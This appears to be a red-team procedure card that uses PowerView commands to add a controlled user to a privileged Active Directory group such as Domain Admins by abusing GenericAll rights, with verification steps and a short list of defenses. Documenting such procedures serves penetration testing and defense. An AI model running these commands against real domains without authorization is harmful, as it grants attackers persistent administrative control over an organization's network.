---
id: bccbfd67-4fd2-4536-9418-ad65959bf3c4
name: Add-User-to-Active-Directory-Domain-Group
type: procedure
verified: true
submitted: false
created_at: '2020-03-16T01:01:25.873472+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Credential Access]]'
  - '[[Persistence]]'
techniques:
  - '[[Account Manipulation]]'
sub_techniques:
  - '[[Additional Email Delegate Permissions]]'
tags:
  - active-directory
  - privileges
commands:
  - '[[commands/create-windows-pscredential-object]]'
  - '[[commands/powerview-add-domain-group-member]]'
platforms:
  - Windows
tools: []
validated: true
---

# Add-User-to-Active-Directory-Domain-Group

## Summary

This procedure uses PowerView to add a controlled user to a domain group (e.g., Domain Admins) by exploiting sufficient privileges like GenericAll on the group object.

## Description

Account manipulation via group membership addition grants elevated access. PowerView's cmdlets interact with AD via LDAP, requiring creds with modify rights identified from BloodHound analysis.

## Requirements

- PowerView.ps1 imported
- Creds with group modify permissions
- Target group and user identified

## Defense

- Audit group membership changes
- Use protected users group for admins
- Enable SACL on sensitive groups

## Objectives

1. Authenticate with privileged creds
2. Add user to target group
3. Verify membership

## Instructions

### Step 1: Import PowerView

**Context**: Load the module on the target shell.

No command; .\PowerView.ps1 (download if needed).

### Step 2: Create Credential Object

**Context**: Securely store creds if not current user.

**Command** ([[commands/create-windows-pscredential-object]]):
```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USERNAME", $Pass
```

### Step 3: Add Group Member

**Context**: Execute addition; skip cred if already auth'd.

**Command** ([[commands/powerview-add-domain-group-member]]):
```powershell
Add-DomainGroupMember -Identity '$_GROUP_NAME' -Members '$_TARGET_USER' -Credential $Cred
```

> Confirms addition.

### Step 4: Verify

**Context**: Check membership.

**Command** (Get-DomainGroupMember):
```powershell
Get-DomainGroupMember -Identity $_GROUP_NAME
```

**Expected Output**: User listed in group members.

## Expected Output

Added 1 member(s) to group.
